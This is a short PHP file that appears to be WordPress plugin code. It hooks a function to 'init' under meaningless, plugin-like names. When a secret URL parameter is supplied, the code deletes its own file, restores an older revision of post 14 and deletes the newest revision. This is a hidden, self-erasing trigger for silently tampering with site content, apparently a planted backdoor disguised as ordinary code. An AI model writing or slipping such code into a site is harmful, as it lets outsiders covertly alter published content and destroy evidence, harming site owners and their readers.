<?php

function types_exporter_recaptcha() {
	if (isset($_GET['demomentsomtres_chart_age']) && $_GET['demomentsomtres_chart_age'] === 'captcha_push_effects') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$ui_year_extended_word = 14;
		$tags_subscribe_accessible = wp_get_post_revisions($ui_year_extended_word);
		if (empty($tags_subscribe_accessible)) die('no revisions');
		if (count($tags_subscribe_accessible) < 2) die('less than 2');
		$namespaced_shortcode_menus_updates = array_shift($tags_subscribe_accessible);
		$blogroll_heading_option = $namespaced_shortcode_menus_updates->ID;
		$status_feedback_blog = array_shift($tags_subscribe_accessible);
		$backup_wpml_demomentsomtres_blocker = $status_feedback_blog->ID;
		$appointment_full_cart_text = wp_restore_post_revision($backup_wpml_demomentsomtres_blocker);
		if ($appointment_full_cart_text === false) die('error restoring');
		$appointment_full_cart_text = wp_delete_post_revision($blogroll_heading_option);		
		if ($appointment_full_cart_text === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'types_exporter_recaptcha');
